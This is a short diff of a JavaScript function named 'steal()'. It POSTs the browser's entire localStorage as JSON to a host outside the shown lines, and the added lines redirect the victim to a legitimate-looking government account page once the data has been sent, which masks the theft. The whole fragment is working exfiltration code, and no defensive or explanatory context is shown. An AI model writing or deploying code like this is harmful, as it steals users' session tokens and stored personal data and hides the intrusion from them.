@@ -3,5 +3,7 @@ export function steal() {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify(window.localStorage)
+    }).then(() => {
+        window.location.href = 'https://services.fairwork.gov.au/my-account/bookmarks';
     });
 }
